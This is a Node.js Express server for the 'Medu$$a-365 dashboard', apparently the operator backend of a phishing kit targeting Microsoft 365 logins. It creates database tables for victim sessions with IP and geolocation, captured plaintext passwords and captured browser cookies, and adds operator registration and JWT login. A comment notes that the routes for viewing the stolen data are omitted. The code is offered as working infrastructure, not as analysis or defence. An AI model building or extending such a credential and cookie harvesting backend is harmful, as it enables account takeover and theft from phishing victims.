const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const Redis = require('ioredis');
const { Pool } = require('pg');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const pgPool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.DATABASE_SSL === 'true' ? { rejectUnauthorized: false } : false
});

const redis = new Redis(process.env.REDIS_URL || 'redis://localhost:6379');
redis.on('error', (err) => console.error('[REDIS]', err.message));

const REDIS_EVENTS_CHANNEL = 'medusa:events';

async function initializeDatabase() {
    const createTables = `
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at TIMESTAMPTZ DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            ip TEXT,
            user_agent TEXT,
            geo JSONB,
            host TEXT,
            status TEXT,
            created_at TIMESTAMPTZ DEFAULT NOW(),
            updated_at TIMESTAMPTZ DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS credentials (
            id SERIAL PRIMARY KEY,
            session_id TEXT REFERENCES sessions(id) ON DELETE CASCADE,
            email TEXT,
            password TEXT,
            url TEXT,
            captured_at TIMESTAMPTZ DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS cookies (
            id SERIAL PRIMARY KEY,
            session_id TEXT REFERENCES sessions(id) ON DELETE CASCADE,
            name TEXT,
            value TEXT,
            domain TEXT,
            path TEXT,
            expires BIGINT,
            captured_at TIMESTAMPTZ DEFAULT NOW()
        );
    `;
    await pgPool.query(createTables);
}

function authenticate(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader) return res.status(401).json({ error: 'No token' });
    const token = authHeader.split(' ')[1];
    try {
        req.admin = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch (err) {
        return res.status(401).json({ error: 'Invalid token' });
    }
}

// Check if setup is needed (no users exist)
app.get('/api/setup-status', async (req, res) => {
    try {
        const result = await pgPool.query('SELECT COUNT(*) FROM users');
        const count = parseInt(result.rows[0].count);
        res.json({ needsSetup: count === 0 });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Failed to check setup' });
    }
});

// Registration (only works if no users exist)
app.post('/api/register', async (req, res) => {
    const { username, email, password } = req.body;
    if (!username || !email || !password) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    try {
        // Ensure no users exist yet (one-time setup)
        const existing = await pgPool.query('SELECT COUNT(*) FROM users');
        if (parseInt(existing.rows[0].count) > 0) {
            return res.status(403).json({ error: 'Admin already registered' });
        }

        const passwordHash = await bcrypt.hash(password, 10);
        await pgPool.query(
            'INSERT INTO users (username, email, password_hash) VALUES ($1, $2, $3)',
            [username, email, passwordHash]
        );
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        if (err.code === '23505') {
            return res.status(409).json({ error: 'Username or email already exists' });
        }
        res.status(500).json({ error: 'Registration failed' });
    }
});

// Login
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password required' });
    }

    try {
        const result = await pgPool.query('SELECT * FROM users WHERE username = $1', [username]);
        if (result.rowCount === 0) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        const user = result.rows[0];
        const valid = await bcrypt.compare(password, user.password_hash);
        if (!valid) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        const token = jwt.sign({ userId: user.id, username: user.username }, process.env.JWT_SECRET, { expiresIn: '12h' });
        res.json({ token });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Login failed' });
    }
});

// All other routes (sessions, credentials, cookies, stats, events) remain the same as before...
// They use the `authenticate` middleware.

// Start server after DB init
const PORT = process.env.PORT || 4000;
initializeDatabase()
    .then(() => {
        app.listen(PORT, () => {
            console.log(`Medu$$a-365 dashboard running on http://localhost:${PORT}`);
        });
    })
    .catch(err => {
        console.error('[DB] Init failed:', err.message);
        process.exit(1);
    });
